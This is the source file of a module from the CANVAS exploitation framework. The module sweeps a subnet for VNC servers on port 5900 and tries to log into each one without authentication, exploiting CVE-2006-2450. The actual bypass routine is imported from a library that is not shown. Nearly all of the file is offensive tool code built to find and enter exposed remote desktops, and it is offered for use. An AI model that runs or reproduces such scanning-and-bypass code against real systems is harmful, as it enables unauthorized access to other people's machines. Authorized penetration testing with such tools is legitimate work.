#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2004-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
Find Non-Authenticated VNC servers
"""

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if "." not in sys.path: sys.path.append(".")
from exploitutils import *
from tcpexploit import tcpexploit

NAME="FIND_NULL_VNC"
DESCRIPTION="Find Non-authenticated VNC Servers"
DOCUMENTATION={}
DOCUMENTATION["CVE Name"] = "CVE-2006-2450"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2450"
DOCUMENTATION['CVSS'] = 7.5
VERSION="1.0"
                                                                                
PROPERTY = {}
PROPERTY['TYPE'] = "Tools"
PROPERTY['ARCH'] = [ ["Windows"],["Linux"],["Solaris"],["AIX"] ]
                                                                                
CHANGELOG="""
                                                                                
"""
NOTES="""
"""

SLIST={0:'Connection Failed', 1:"No authorization required!", 2:"Authentication Required"}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.lenchunk=0
        self.setPort(5900)
        self.setHost("")
        self.setVersion(1)
        self.badstring=""
        self.istest=0
        self.netmask = "32"
        self.name=NAME
        return

    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]
                                                                                
    def createShellcode(self):
        return 0
    
    def run_on_host(self, target):
        import socket
        from libs import rfb
        try:
            r=rfb.RFB_Client(target.interface, self.port)
        except socket.error, msg:
            self.log("1) %s" % str(msg))
            return 0
        except timeoutsocket.Timeout, msg:
            self.log("Timeout: %s" % str(msg))
            return 0

        auth=r.force_no_auth()
        r.close()
        self.log("Host: %s [%s]" % (self.host, SLIST[auth]))                 
        return auth
    
    def run(self):
        """
        Actually exploit the target.
         """
        self.host=self.target.interface
        self.netmask=self.argsDict.get("netmask",self.netmask).replace("/","")
        self.setInfo("Scanning %s"%(self.host))
        self.log("Interface=%s"%self.host)
        self.log("Netmask=%s"%self.netmask)

        self.run_on_all_known_hosts()
        
    def test(self):
        return 0
        
    def usage(self):
        app = theexploit()
        print "Usage: "+sys.argv[0]+" [-T] [-v version]  -t target [ -p targetport:%d]"%(app.port)
        sys.exit()

        print "Usage: "+sys.argv[0]+" -t ourip [ -p targetport] -l localip -d localport "
        print "localip: The IP where our server is listening"

if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)

